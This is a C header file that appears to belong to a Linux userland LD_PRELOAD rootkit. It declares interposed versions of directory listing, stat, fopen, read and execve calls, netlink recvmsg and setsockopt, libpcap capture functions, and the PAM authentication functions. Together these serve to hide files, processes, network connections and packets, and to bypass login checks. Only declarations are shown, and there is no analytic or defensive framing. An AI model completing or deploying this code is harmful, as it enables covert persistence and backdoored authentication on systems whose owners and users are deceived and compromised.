#ifndef HOOKS_H_
#define HOOKS_H_

#define _GNU_SOURCE

#include <dirent.h>
#include <pcap/pcap.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/stat.h>

#define LD_HOOK __attribute__((visibility("default")))

typedef int (*fstatat_fn)(int, const char *, struct stat *, int);
typedef int (*pam_acct_mgmt_fn)(pam_handle_t *, int);
typedef int (*pam_authenticate_fn)(pam_handle_t *, int);
typedef int (*execve_fn)(const char *, char *const[], char *const[]);
typedef FILE* (*fopen64_fn)(const char *, const char *);
typedef int (*stat_fn)(const char *restrict, struct stat *restrict);
typedef ssize_t (*read_fn)(int, void *, size_t);
typedef int (*pcap_stats_fn)(pcap_t *, struct pcap_stat *);
typedef FILE *(*fopen_fn)(const char *restrict, const char *restrict);
typedef ssize_t (*recvmsg_fn)(int, struct msghdr *, int);
typedef int (*pam_set_item_fn)(pam_handle_t *, int, const void *);
typedef int (*statx_fn)(int, const char *, int,
                          unsigned int, struct statx *);
typedef int (*fstatat64_fn)(int, const char *, struct stat64 *, int);
typedef int (*pcap_loop_fn)(pcap_t *, int, pcap_handler, u_char *);
typedef struct dirent *(*readdir_fn)(DIR *);
typedef struct dirent64 *(*readdir64_fn)(DIR *);

struct net_data {
    unsigned char sa_family;
    char pad1[3];
    uint16_t port1;
    uint16_t port2;
    uint32_t ip1;
    char pad2[12];
    uint32_t ip2;
  };
  struct protocol_struct {
    uint32_t len;
    uint16_t unk1;
    char pad1[10];
    struct net_data ndata;
  };

LD_HOOK int fstatat (int fd, const char *restrict path,
                     struct stat *restrict buf, int flag);
LD_HOOK int pam_acct_mgmt(pam_handle_t *pamh, int flags);
LD_HOOK int pam_authenticate(pam_handle_t *pamh, int flags);
LD_HOOK int execve(const char *pathname, char *const _Nullable argv[],
                   char *const _Nullable envp[]);
LD_HOOK FILE *fopen64(const char *pathname, const char *mode);
LD_HOOK int stat(const char *restrict pathname,
                 struct stat *restrict statbuf);
LD_HOOK ssize_t read(int fd, void *buf, size_t count);
LD_HOOK int pcap_stats(pcap_t *p, struct pcap_stat *ps);
LD_HOOK int setsockopt(int socket, int level, int option_name,
                       const void *option_value, socklen_t option_len);
LD_HOOK FILE *fopen(const char *restrict pathname,
                    const char *restrict mode);
LD_HOOK ssize_t recvmsg(int socket, struct msghdr *message, int flags);
LD_HOOK int pam_set_item(pam_handle_t *pamh, int item_type,
                         const void *item);
LD_HOOK int statx(int dirfd, const char *_Nullable restrict pathname,
                  int flags, unsigned int mask,
                  struct statx *restrict statxbuf);
LD_HOOK int fstatat64(int dirfd, const char *pathname,
                      struct stat64 *statbuf, int flags);
LD_HOOK int pcap_loop(pcap_t *p, int cnt,
                      pcap_handler callback, u_char *user);
LD_HOOK struct dirent *readdir(DIR *dirp);
LD_HOOK struct dirent64 *readdir64(DIR *dirp);
#endif // HOOKS_H_
